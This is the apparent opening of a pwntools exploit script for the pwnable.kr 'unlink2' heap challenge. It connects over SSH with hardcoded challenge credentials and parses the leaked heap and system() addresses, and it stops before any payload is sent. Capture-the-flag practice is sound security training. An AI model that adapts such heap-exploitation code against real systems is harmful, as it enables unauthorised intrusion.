from pwn import *

connection = ssh(
    host='pwnable.kr',
    user='christmas1',
    password='apflzmfltmaktm',
    port=2222)

p = connection.process('/home/christmas1/unlink2')

VERBOSE = False


def next(until):
    s = p.recvuntil(until)
    if VERBOSE:
        log.info(s)
    return s


next("A B C is allocated inside heap (")
s = next(")")
addr_arr = s[:-1].split(', ')
addr_a = int(addr_arr[0], 16)
addr_b = int(addr_arr[1], 16)
addr_c = int(addr_arr[2], 16)
log.success('A: %x / B: %x / C: %x' % (addr_a, addr_b, addr_c))

next("system address: 0x")
addr_system = int(next(".")[:-1], 16)
log.success('system: %x' % (addr_system))

next("B's fd/bk pointer\n")
